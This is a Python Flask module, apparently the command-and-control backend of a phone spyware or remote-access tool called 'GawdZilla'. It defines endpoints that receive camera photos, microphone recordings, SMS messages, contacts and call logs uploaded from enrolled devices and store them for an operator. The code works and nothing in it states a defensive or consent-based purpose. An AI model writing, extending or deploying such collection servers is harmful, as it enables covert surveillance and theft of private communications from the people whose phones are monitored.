"""
GawdZilla — Extended device endpoints
Media (camera/mic), SMS, contacts, call log.
Created by MiSFiT SeCuRiTY
"""

import base64
import datetime
from flask import request, jsonify

from core import db, config, events


def register(app):

    def _dev(token):
        c = db.conn()
        row = c.execute("SELECT id, name FROM devices WHERE enroll_token=?", (token,)).fetchone()
        c.close()
        return row

    @app.route("/device/media", methods=["POST"])
    def device_media():
        data = request.get_json(silent=True) or {}
        token = data.get("token")
        kind  = data.get("kind")
        b64   = data.get("data_b64")

        if not token or not kind or not b64:
            return jsonify(ok=False, error="missing token/kind/data"), 400

        dev = _dev(token)
        if not dev:
            return jsonify(ok=False, error="unknown token"), 403

        ext = "jpg" if kind == "camera" else "m4a"
        media_dir = config.DATA_DIR / "media"
        media_dir.mkdir(parents=True, exist_ok=True)
        fname = f"{kind}-{dev['id']}-{int(datetime.datetime.now().timestamp())}.{ext}"
        fpath = media_dir / fname
        try:
            fpath.write_bytes(base64.b64decode(b64))
        except Exception as e:
            return jsonify(ok=False, error=f"decode failed: {e}"), 400

        db.audit("device", f"media.{kind}", f"device:{dev['id']}", fname)
        events.publish(f"media_{kind}", {"file": fname, "size": fpath.stat().st_size}, dev["id"])
        return jsonify(ok=True, file=fname)

    @app.route("/device/sms", methods=["POST"])
    def device_sms():
        data = request.get_json(silent=True) or {}
        token = data.get("token")
        items = data.get("items") or []
        if not token:
            return jsonify(ok=False, error="missing token"), 400
        dev = _dev(token)
        if not dev:
            return jsonify(ok=False, error="unknown token"), 403

        c = db.conn()
        for it in items[:200]:
            c.execute("INSERT INTO events (device_id, kind, payload) VALUES (?,?,?)",
                      (dev["id"], "sms", f"{it.get('address','')}:{it.get('body','')[:120]}"))
        c.commit(); c.close()
        events.publish("sms", {"count": len(items)}, dev["id"])
        return jsonify(ok=True, stored=len(items))

    @app.route("/device/contacts", methods=["POST"])
    def device_contacts():
        data = request.get_json(silent=True) or {}
        token = data.get("token")
        items = data.get("items") or []
        if not token:
            return jsonify(ok=False, error="missing token"), 400
        dev = _dev(token)
        if not dev:
            return jsonify(ok=False, error="unknown token"), 403

        c = db.conn()
        for it in items[:500]:
            c.execute("INSERT INTO events (device_id, kind, payload) VALUES (?,?,?)",
                      (dev["id"], "contact", f"{it.get('name','')}:{it.get('number','')}"))
        c.commit(); c.close()
        events.publish("contacts", {"count": len(items)}, dev["id"])
        return jsonify(ok=True, stored=len(items))

    @app.route("/device/calllog", methods=["POST"])
    def device_calllog():
        data = request.get_json(silent=True) or {}
        token = data.get("token")
        items = data.get("items") or []
        if not token:
            return jsonify(ok=False, error="missing token"), 400
        dev = _dev(token)
        if not dev:
            return jsonify(ok=False, error="unknown token"), 403

        c = db.conn()
        for it in items[:500]:
            c.execute("INSERT INTO events (device_id, kind, payload) VALUES (?,?,?)",
                      (dev["id"], "call", f"{it.get('number','')}:{it.get('type')}:{it.get('duration')}s"))
        c.commit(); c.close()
        events.publish("calllog", {"count": len(items)}, dev["id"])
        return jsonify(ok=True, stored=len(items))
